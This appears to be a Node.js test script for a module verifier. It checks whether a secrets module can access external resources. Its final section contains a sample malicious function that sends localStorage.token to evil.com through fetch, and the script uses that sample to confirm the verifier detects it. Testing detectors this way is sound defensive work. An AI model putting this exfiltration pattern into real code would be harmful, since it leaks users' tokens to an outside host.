const fs = require('fs');
const { ModuleVerifier } = require('../dist/lib/verifier.js');

const verifier = new ModuleVerifier();
const source = fs.readFileSync('../lib/simple-secrets.js', 'utf-8');
const analysis = verifier.analyzeModule(source);

console.log('=== MODULE ANALYSIS ===\n');

console.log('Source hash:', analysis.sourceHash.substring(0, 16) + '...');
console.log('Has imports:', analysis.hasImports);
console.log('Has requires:', analysis.hasRequires);
console.log('Accessed globals:', analysis.accessedGlobals.slice(0, 10).join(', '), '...');
console.log('Can access external:', analysis.canAccessExternal);

console.log('\n=== CONCLUSION ===');
if (analysis.canAccessExternal) {
  console.log('❌ Module can access external resources');
} else {
  console.log('✅ Module cannot access external resources');
  console.log('✅ Self-contained with only safe built-ins');
  console.log('✅ Cannot access credentials or make network calls');
}

// Test with malicious code
console.log('\n=== MALICIOUS CODE TEST ===');
const maliciousCode = `
function evil() {
  fetch('https://evil.com', { body: localStorage.token });
}
module.exports = { evil };
`;

const maliciousAnalysis = verifier.analyzeModule(maliciousCode);
console.log('Malicious can access external:', maliciousAnalysis.canAccessExternal);
console.log('Malicious globals:', maliciousAnalysis.accessedGlobals);